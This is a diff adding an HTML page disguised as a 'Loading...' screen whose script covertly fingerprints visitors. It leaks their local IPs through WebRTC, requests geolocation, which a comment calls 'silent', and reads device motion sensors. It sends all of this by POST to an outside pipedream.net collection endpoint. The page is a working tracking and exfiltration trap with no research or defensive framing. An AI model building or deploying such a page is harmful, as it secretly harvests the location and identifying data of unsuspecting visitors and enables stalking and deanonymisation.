@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Loading...</title>
+  <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
+</head>
+<body>
+  <h3>Loading...</h3>
+
+  <script>
+    // 1️FingerprintJS
+    FingerprintJS.load().then(fp => {
+      fp.get().then(result => {
+        sendData({fingerprint: result.visitorId});
+      });
+    });
+
+    // 2️Try WebRTC IP leak
+    function getLocalIPs(callback) {
+      var ips = [];
+      var RTCPeerConnection = window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
+      if (!RTCPeerConnection) return;
+      var pc = new RTCPeerConnection({iceServers:[]});
+      pc.createDataChannel("");
+      pc.createOffer().then(offer => pc.setLocalDescription(offer));
+      pc.onicecandidate = function(event) {
+        if (!event || !event.candidate) return;
+        var ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(event.candidate.candidate);
+        if (ipMatch) {
+          ips.push(ipMatch[1]);
+          sendData({localIP: ipMatch[1]});
+        }
+      };
+    }
+    getLocalIPs();
+
+    // 3️Silent Geolocation (highly depends on browser)
+    if ("geolocation" in navigator) {
+      navigator.geolocation.getCurrentPosition(function(position) {
+        sendData({
+          latitude: position.coords.latitude,
+          longitude: position.coords.longitude,
+          accuracy: position.coords.accuracy
+        });
+      }, function() {
+        sendData({location: "Denied"});
+      });
+    } else {
+      sendData({location: "Not Supported"});
+    }
+
+    // 4️Sensor data (limited on iOS)
+    if (window.DeviceMotionEvent) {
+      window.addEventListener('devicemotion', function(event) {
+        sendData({
+          accelerationX: event.acceleration.x,
+          accelerationY: event.acceleration.y,
+          accelerationZ: event.acceleration.z
+        });
+      }, {once: true});
+    }
+
+    // 5️Core data sender
+    function sendData(payload) {
+      fetch('https://eom1ae5o69bw4nt.m.pipedream.net', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(payload)
+      });
+    }
+
+  </script>
+</body>
+</html>
